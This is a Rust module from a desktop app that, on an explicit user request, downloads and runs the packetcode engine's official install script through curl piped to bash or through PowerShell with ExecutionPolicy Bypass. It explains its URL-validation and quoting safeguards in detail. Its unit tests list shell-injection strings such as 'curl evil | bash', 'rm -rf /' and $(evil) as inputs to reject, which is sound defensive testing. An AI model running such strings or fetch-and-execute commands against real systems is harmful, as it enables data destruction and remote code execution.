//! Optional, explicitly user-initiated install of the packetcode engine.
//!
//! # THIS MODULE DOWNLOADS AND EXECUTES A REMOTE SCRIPT
//!
//! [`acp_install_engine`] fetches the packetcode project's own install script
//! over HTTPS and runs it — `install.ps1` through PowerShell on Windows,
//! `install.sh` through bash on macOS/Linux. That is remote code execution by
//! definition, and every constraint below exists to keep it from becoming
//! remote code execution *by anyone other than the user in front of the app*:
//!
//! 1. **Never automatic.** Nothing in PacketADE calls this. It runs only when
//!    the `acp_install_engine` command is invoked, which the UI gates behind an
//!    explicit button press. Engine resolution, probing, and lazy engine start
//!    all fail with "not installed" rather than reaching for this.
//! 2. **The URL is a compile-time constant.** [`WINDOWS_INSTALL_URL`] /
//!    [`UNIX_INSTALL_URL`] are baked into the binary. The command takes **no
//!    URL parameter and no script parameter**, on purpose: a URL that crossed
//!    the IPC boundary would let anything able to reach a Tauri command — a
//!    compromised renderer, an injected script in a webview, a malicious
//!    prompt that reached a tool — make PacketADE download and run arbitrary
//!    code as the user. Do not add such a parameter. If a future caller needs
//!    a different script, add another compile-time constant.
//! 3. **The only override is an environment variable**, [`INSTALL_URL_ENV`],
//!    for developing against a fork. An attacker who can set this process's
//!    environment already has code execution, so it grants nothing new — and
//!    it is still forced through [`validate_install_url`].
//! 4. **The URL is validated and quoted** before it reaches a shell:
//!    `https://` only, and a character allowlist with no quote, backtick,
//!    `$`, `;`, `|`, `&`, parenthesis, or whitespace in it. The URL is then
//!    embedded single-quoted, so even a hostile env var cannot break out of
//!    the string and append a command.
//! 5. **Success is a post-condition, not an exit code.** A zero exit only
//!    gets us to the re-probe; the install is reported successful only when
//!    the engine actually resolves *and* clears the version gate.

use std::process::Stdio;
use std::time::Duration;

use serde::Serialize;
use tauri::{AppHandle, Emitter, State};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::time::timeout;

use super::{is_running, run_probe, AcpState, EngineProbe};

/// The documented Windows one-liner from the packetcode README ("Install the
/// latest checksum-verified Windows release"). The script itself verifies a
/// SHA-256 from the release's `checksums.txt` before installing.
const WINDOWS_INSTALL_URL: &str =
    "https://raw.githubusercontent.com/packetloss404/packetcode/main/install.ps1";
/// The documented macOS/Linux install script from the same README. Also
/// checksum-verifying; see `install.sh` in the packetcode repo.
const UNIX_INSTALL_URL: &str =
    "https://raw.githubusercontent.com/packetloss404/packetcode/main/install.sh";

/// Development-only override for the install script URL. See the module doc:
/// this is an env var and NOT a command parameter, and that distinction is the
/// whole security story of this module.
const INSTALL_URL_ENV: &str = "PACKETADE_ACP_INSTALL_URL";
/// Legacy name from the standalone packetcode GUI prototype, honoured for the
/// same reason [`super::LEGACY_ENGINE_PATH_ENV`] is.
const LEGACY_INSTALL_URL_ENV: &str = "PACKETCODE_GUI_INSTALL_URL";

/// Where the Unix installer is told to put the binary.
///
/// `install.sh` defaults to `/usr/local/bin`, which on a stock macOS or Linux
/// box is not user-writable and makes the script call `sudo`. A GUI app has no
/// terminal to answer a password prompt on, so that default would simply hang
/// until [`INSTALL_TIMEOUT`]. The README's own sudo-free variant
/// (`INSTALL_DIR="$HOME/.local/bin"`) is therefore what PacketADE uses — and
/// [`super::install_dir_candidates`] looks there first as a result.
const UNIX_INSTALL_DIR: &str = "$HOME/.local/bin";

/// Line-by-line installer output. The `line` is exactly one line of the
/// script's stdout or stderr.
pub const INSTALL_OUTPUT_EVENT: &str = "acp:install-output";

/// The install downloads a release archive; on a slow link that is minutes,
/// not seconds. Bounded all the same — a wedged installer must not become a
/// permanent spinner.
const INSTALL_TIMEOUT: Duration = Duration::from_secs(10 * 60);
/// How long to wait for the output pumps to reach EOF after the child exits,
/// so the log tail (install location, error text) lands before the result.
const DRAIN_GRACE: Duration = Duration::from_secs(5);

/// What to tell a user PacketADE cannot install for.
pub const MANUAL_INSTALL_HINT: &str =
    "PacketADE cannot install the packetcode engine on this platform. Install it yourself \
     (see the packetcode README), then make sure `packetcode` is on PATH or set \
     PACKETADE_ACP_ENGINE to its full path.";

/// Whether [`acp_install_engine`] can run here. Windows, macOS, and Linux are
/// the three platforms packetcode publishes an install script for; anything
/// else gets an honest `false` and [`MANUAL_INSTALL_HINT`].
pub const fn install_supported() -> bool {
    cfg!(any(windows, target_os = "macos", target_os = "linux"))
}

/// One line of installer output, as delivered to the frontend.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallOutput {
    pub line: String,
    /// "stdout" or "stderr". `install.ps1` writes warnings to stderr and
    /// `install.sh` writes its progress to stdout, so the UI can style them
    /// differently instead of guessing from the text.
    pub stream: &'static str,
}

/// The compile-time install URL for this platform, or `None` where PacketADE
/// does not install the engine at all.
const fn platform_install_url() -> Option<&'static str> {
    if cfg!(windows) {
        Some(WINDOWS_INSTALL_URL)
    } else if cfg!(any(target_os = "macos", target_os = "linux")) {
        Some(UNIX_INSTALL_URL)
    } else {
        None
    }
}

/// Rejects anything that is not a plain `https://` URL made of characters that
/// are inert inside a single-quoted shell/PowerShell string.
///
/// The allowlist is deliberately narrower than RFC 3986: `'` is a legal
/// sub-delim in a URI but would close the quoting we rely on, and `$`, backtick,
/// `;`, `|`, `&`, `(`, `)`, `<`, `>`, `{`, `}`, `\`, `"` and whitespace are all
/// shell- or PowerShell-active. Percent-encoding covers anything a real install
/// URL could legitimately need.
pub fn validate_install_url(url: &str) -> Result<(), String> {
    if !url.starts_with("https://") {
        return Err(format!("install URL must be https://, got {url:?}"));
    }
    if url.len() > 2048 {
        return Err("install URL is implausibly long".to_string());
    }
    const EXTRA_ALLOWED: &str = "-._~:/?#[]@%+,=!*";
    if let Some(bad) = url
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || EXTRA_ALLOWED.contains(*c)))
    {
        return Err(format!(
            "install URL contains a character that is not allowed here: {bad:?}"
        ));
    }
    Ok(())
}

/// The install URL to use: the development env override when set and valid,
/// otherwise this platform's compile-time constant.
fn resolve_install_url() -> Result<String, String> {
    for var in [INSTALL_URL_ENV, LEGACY_INSTALL_URL_ENV] {
        if let Ok(raw) = std::env::var(var) {
            let raw = raw.trim();
            if !raw.is_empty() {
                validate_install_url(raw).map_err(|e| format!("{var}: {e}"))?;
                return Ok(raw.to_string());
            }
        }
    }
    let url = platform_install_url().ok_or_else(|| MANUAL_INSTALL_HINT.to_string())?;
    // Belt and braces: the constants are ours, but the check is what keeps a
    // careless edit to them from silently reintroducing shell injection.
    validate_install_url(url)?;
    Ok(url.to_string())
}

/// Program + args that fetch and run the install script.
///
/// Split out of [`acp_install_engine`] so the exact command line is unit
/// testable — the quoting here is a security property, not a formatting
/// detail. `url` must already have passed [`validate_install_url`].
fn install_command(url: &str) -> Result<(&'static str, Vec<String>), String> {
    validate_install_url(url)?;
    if cfg!(windows) {
        // `Stop` turns the script's non-terminating errors into a nonzero exit
        // instead of red text next to exit code 0.
        let script = format!(
            "$ErrorActionPreference='Stop'; \
             & ([scriptblock]::Create((Invoke-WebRequest '{url}' -UseBasicParsing).Content))"
        );
        Ok((
            "powershell",
            vec![
                "-NoProfile".into(),
                "-ExecutionPolicy".into(),
                "Bypass".into(),
                "-Command".into(),
                script,
            ],
        ))
    } else if cfg!(any(target_os = "macos", target_os = "linux")) {
        // `pipefail` matters: without it the exit status is curl's downstream
        // bash, so a 404 that produced an empty script would "succeed".
        // install.sh has a bash shebang and the README pipes it to bash, so
        // bash (not sh) is the documented interpreter on both ends.
        let script = format!(
            "set -o pipefail; curl -fsSL '{url}' | INSTALL_DIR=\"{UNIX_INSTALL_DIR}\" bash"
        );
        Ok(("bash", vec!["-c".into(), script]))
    } else {
        Err(MANUAL_INSTALL_HINT.to_string())
    }
}

/// Pumps one of the installer's pipes to [`INSTALL_OUTPUT_EVENT`], a line at a
/// time.
///
/// Reads raw bytes and converts lossily rather than using a `String`-typed
/// reader: PowerShell 5.1 emits OEM-codepage output (cp437/cp850 on a typical
/// Windows box), so a single byte that is not valid UTF-8 would otherwise
/// abort the read and truncate the log exactly where the interesting error
/// text is.
async fn stream_install_output(
    app: AppHandle,
    pipe: impl tokio::io::AsyncRead + Unpin,
    stream: &'static str,
) {
    let mut reader = BufReader::new(pipe);
    let mut buf = Vec::new();
    loop {
        buf.clear();
        match reader.read_until(b'\n', &mut buf).await {
            Ok(0) | Err(_) => break,
            Ok(_) => {
                let line = String::from_utf8_lossy(&buf).trim_end().to_string();
                let _ = app.emit(INSTALL_OUTPUT_EVENT, InstallOutput { line, stream });
            }
        }
    }
}

/// Downloads and runs the packetcode project's official install script.
///
/// **Read the module documentation before touching this.** It executes remote
/// code, and must only ever run because the user clicked a button that says so.
///
/// Progress is streamed as [`INSTALL_OUTPUT_EVENT`] events. Success requires
/// the post-install probe to both find the engine and clear the version gate;
/// a zero exit status alone is not enough. The resulting [`EngineProbe`] is
/// returned so the caller does not need a second round trip.
#[tauri::command]
pub async fn acp_install_engine(
    app: AppHandle,
    state: State<'_, AcpState>,
) -> Result<EngineProbe, String> {
    install_engine_on(&app, &state).await
}

/// Command body, taking `&AcpState` so it is reachable without a Tauri
/// `State` wrapper.
pub async fn install_engine_on(
    app: &AppHandle,
    state: &AcpState,
) -> Result<EngineProbe, String> {
    if !install_supported() {
        return Err(MANUAL_INSTALL_HINT.to_string());
    }
    // One install at a time. Two concurrent runs would race on the same
    // destination file, and on Windows the loser fails with a sharing
    // violation halfway through.
    let _guard = state
        .installing
        .try_lock()
        .map_err(|_| "An engine install is already running.".to_string())?;
    // Replacing a running engine's own executable fails outright on Windows
    // and silently leaves the old process on the old binary everywhere else.
    if is_running(state).await {
        return Err(
            "Stop the packetcode engine before installing: its executable is in use.".to_string(),
        );
    }

    let url = resolve_install_url()?;
    let (program, args) = install_command(&url)?;

    let mut command = Command::new(program);
    command
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    crate::commands::shared::hide_window_async(&mut command);
    // Same reason the engine gets its own group (see `start_engine`): the
    // installer spawns curl/tar/Expand-Archive children, and a timeout must be
    // able to reap the whole tree rather than orphan a half-finished download.
    #[cfg(unix)]
    command.process_group(0);

    let mut child = command
        .spawn()
        .map_err(|e| format!("failed to launch the installer ({program}): {e}"))?;

    let stdout = child.stdout.take().ok_or("no stdout on installer")?;
    let stderr = child.stderr.take().ok_or("no stderr on installer")?;
    let readers = [
        tauri::async_runtime::spawn(stream_install_output(app.clone(), stdout, "stdout")),
        tauri::async_runtime::spawn(stream_install_output(app.clone(), stderr, "stderr")),
    ];

    let status = match timeout(INSTALL_TIMEOUT, child.wait()).await {
        Err(_) => {
            super::kill_process_tree(&child).await;
            return Err("installer timed out".to_string());
        }
        Ok(result) => result.map_err(|e| format!("installer failed to run: {e}"))?,
    };
    // Drain the pipes so the log tail is delivered before a result is
    // reported. Readers end at pipe EOF.
    for reader in readers {
        let _ = timeout(DRAIN_GRACE, reader).await;
    }
    if !status.success() {
        return Err(format!("installer exited with {status}"));
    }

    // The real post-condition: the engine resolves and passes the gate.
    let probe = run_probe(state).await?;
    if !probe.found {
        return Err(format!(
            "The installer finished, but packetcode still was not found. It may have installed \
             to a custom location — set {} to its full path.",
            super::ENGINE_PATH_ENV
        ));
    }
    if !probe.compatible {
        return Err(format!(
            "The installer finished, but the installed packetcode ({}) is older than the \
             required {}.",
            probe.version.as_deref().unwrap_or("unknown"),
            probe.minimum_version
        ));
    }
    Ok(probe)
}

#[cfg(test)]
mod tests {
    use super::{
        install_command, install_supported, platform_install_url, validate_install_url,
        UNIX_INSTALL_URL, WINDOWS_INSTALL_URL,
    };
    #[cfg(unix)]
    use super::UNIX_INSTALL_DIR;

    #[test]
    fn install_urls_are_https_and_shell_inert() {
        validate_install_url(WINDOWS_INSTALL_URL).expect("windows URL");
        validate_install_url(UNIX_INSTALL_URL).expect("unix URL");
    }

    /// The env override exists for development, so it must still be forced
    /// through the same allowlist the constants are. Each of these is a way to
    /// turn "fetch a script" into "run whatever I say".
    #[test]
    fn hostile_install_urls_are_rejected() {
        for bad in [
            "http://example.com/install.sh",
            "file:///tmp/evil.sh",
            "",
            "example.com/install.sh",
            // Shell/PowerShell breakouts, all of which the quoting relies on
            // never seeing.
            "https://x/i.sh'; curl evil | bash; echo '",
            "https://x/i.sh; rm -rf /",
            "https://x/i.sh | bash",
            "https://x/i.sh && evil",
            "https://x/$(evil)",
            "https://x/`evil`",
            "https://x/i.sh\nevil",
            "https://x/i.sh evil",
            "https://x/i.sh\"",
            "https://x/(evil)",
            "https://x/{evil}",
            "https://x/<evil",
            "https://x\\evil",
        ] {
            assert!(
                validate_install_url(bad).is_err(),
                "should have been rejected: {bad:?}"
            );
        }
    }

    /// Every supported platform must have a compile-time URL, and every
    /// unsupported one must have none — `install_supported` and
    /// `platform_install_url` are the two halves of the same claim and must
    /// never disagree, or the UI offers a button that cannot work.
    #[test]
    fn support_flag_matches_the_available_url() {
        assert_eq!(install_supported(), platform_install_url().is_some());
    }

    #[cfg(windows)]
    #[test]
    fn windows_command_quotes_the_url_and_fails_hard() {
        let (program, args) = install_command(WINDOWS_INSTALL_URL).expect("windows command");
        assert_eq!(program, "powershell");
        assert_eq!(&args[..4], ["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"]);
        let script = &args[4];
        // Single-quoted, so a URL cannot terminate the argument even if the
        // allowlist were ever loosened.
        assert!(script.contains(&format!("'{WINDOWS_INSTALL_URL}'")), "{script}");
        // Non-terminating errors must fail the run, not print red and exit 0.
        assert!(script.contains("$ErrorActionPreference='Stop'"), "{script}");
        assert!(script.contains("-UseBasicParsing"), "{script}");
    }

    #[cfg(unix)]
    #[test]
    fn unix_command_avoids_sudo_and_checks_the_pipeline() {
        let (program, args) = install_command(UNIX_INSTALL_URL).expect("unix command");
        assert_eq!(program, "bash");
        assert_eq!(args[0], "-c");
        let script = &args[1];
        assert!(script.contains(&format!("'{UNIX_INSTALL_URL}'")), "{script}");
        // A GUI app cannot answer a sudo prompt, so the install must target a
        // user-writable directory rather than install.sh's /usr/local/bin.
        assert!(
            script.contains(&format!("INSTALL_DIR=\"{UNIX_INSTALL_DIR}\"")),
            "{script}"
        );
        assert!(!script.contains("sudo"), "{script}");
        // Without pipefail the status is bash's, so a failed curl would read
        // as a successful install.
        assert!(script.contains("set -o pipefail"), "{script}");
        assert!(script.contains("curl -fsSL"), "{script}");
    }

    /// Whatever the platform, a URL that never passed the allowlist must not
    /// be able to reach a shell.
    #[test]
    fn command_construction_revalidates_the_url() {
        assert!(install_command("https://x/i.sh'; evil; echo '").is_err());
        assert!(install_command("http://x/i.sh").is_err());
    }
}
